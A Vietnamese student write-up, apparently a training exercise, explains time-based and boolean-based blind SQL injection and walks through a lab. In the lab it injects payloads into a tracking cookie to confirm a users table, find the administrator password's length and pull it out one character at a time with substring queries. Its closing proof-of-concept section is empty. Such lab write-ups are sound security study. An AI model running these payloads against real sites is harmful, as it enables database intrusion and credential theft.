Người thực hiện: Lê Trần Văn Chương.
Deadline: 31/03 - 02/04/2022.
Mục lục:
- Lỗ hổng SQL Injection Time Based và Boolean Based là gì?
- Lab Blind SQLi
- Code PoC

## Lỗ hổng SQL Injection Time Based và Boolean Based là gì?
- Time-based SQLi đây là 1 kỹ thuật tấn công chậm, mục đích làm trì hoãn việc truy vấn dữ liệu từ client. Trong khoảng thời gian bị trì hoãn đó kẻ tấn công có thể thực hiện các câu truy vấn khác và sau khi có phản hồi thì kẻ tấn công của có thể biết được loại DB mà máy chủ đang dụng.
- Boolean based SQLi cũng là kỹ thuật tấn công chậm, tùy thuộc vào kết quả boolean (True or False), nội dung trong phản hồi HTTP sẽ thay đổi hoặc giữ nguyên. Kết quả cho phép kẻ tấn công đánh giá liệu trọng tải được sử dụng trả về đúng hay sai.
=> Cả 2 loại tấn công trên được gọi chung là Blind SQLi.

## Lab Blind SQLi?
- Lab sử dụng tracking cookie để phân tích và truy vấn SQL. 
- Truy vấn trả về thông báo 'Welcome back!' hoặc không trả về thông báo. (True or False)

1. Ta dùng extension `EditThisCookie` của chrome để có thể bắt được TrackingId và TrackingId của lab là `SHgOlSPYCX3mPVyc` của Lab.

2. Ta thêm truy vấn logic và sao TrackingId để nắm bắt cơ chế của nó.
    `TrackingId' and 1=1`-- => Hiện thông báo `Welcome back!`
    `TrackingId' and 1=0`-- => Không hiện thông báo.

3. Ta thử thêm truy vấn select để xem thử có bảng users, username là administrator và password như lab đã cho không.
    `TrackingId' and(select 'x' from users LIMIT 1)='x'`-- => Hiện thông báo `Welcome back!`. Vậy là có bảng users.
    Sử dụng `Burp suite` để payload username bằng cách sử dụng hàm `substring` để lấy từ ký tự trong username.
    `TrackingId' and(select substring(username,1,1) from users LIMIT 1 )='a'--` => Hiện thông báo `Welcome back!`. Vậy là có username là administrator.
    
    Vì không biết password có đồ dài bao nhiêu nên ta sử dụng LENGHT để có thể kiểm tra độ dài của password
    `TrackingId' and(select username from users where username = 'administrator' and LENGTH(password)>1)='administrator'--` => Hiện thông báo `Welcome back!`. Vậy chứng tỏ password có độ dài > 1 ký tự.
    `TrackingId' and(select username from users where username = 'administrator' and LENGTH(password)>25)='administrator'--` => Không hiện thông báo. Vậy chứng tỏ password có độ dài < 25 ký tự.
    Tiếp tục test
    
    `TrackingId' and(select username from users where username = 'administrator' and LENGTH(password)>20)='administrator'--` => Không hiện thông báo. Vậy chứng tỏ password có độ dài < 20 ký tự.
    `TrackingId' and(select username from users where username = 'administrator' and LENGTH(password)>19)='administrator'--` => Hiện thông báo `Welcome back!`. Vậy chứng tỏ password có độ dài > 19 ký tự.
    `TrackingId' and(select username from users where username = 'administrator' and LENGTH(password)=20)='administrator'--` => Hiện thông báo `Welcome back!`. Vậy chứng tỏ password có độ dài 20 ký tự.

4. Bây giờ, chúng ta đã biết username là administrator và password có đồ dài từ 20 ký tự. Sử dụng `Burp suite` để payload password của administrator bằng cách sử dụng hàm substring để lấy từ ký tự trong password.
    `TrackingId' and(select substring(password,1,1) from users where username = 'administrator' )='a'--`
    Sau khi payload thì ta có được 1 chuỗi password như sau: `vxeddqsvrm6gfo75xs7h`

## Code PoC